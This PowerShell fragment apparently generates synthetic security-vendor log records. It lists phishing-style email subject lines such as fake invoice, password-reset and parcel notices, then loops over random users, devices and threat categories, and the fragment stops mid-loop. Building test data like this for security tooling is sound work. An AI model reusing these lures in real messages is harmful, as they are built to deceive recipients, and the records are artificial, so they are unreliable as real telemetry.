    $emailSubj = @(
        "Urgent: Invoice attached","Your account has been compromised","DHL Delivery Notification",
        "HR: Action Required","IT: Reset your password","Meeting tomorrow - agenda attached",
        "FWD: Confidential Q4 report","Your parcel could not be delivered"
    )

    for ($i = 0; $i -lt $RecordsPerVendor; $i++) {
        $ts      = Get-RandomTs
        $dev     = Get-RandomDevice
        $user    = Get-RandomUser
        $prod    = Pick $products
        $tcat    = Pick $threatCats
        $tnames  = if ($threats.ContainsKey($tcat)) { $threats[$tcat] } else { $threats["default"] }
        $threat  = Pick $tnames
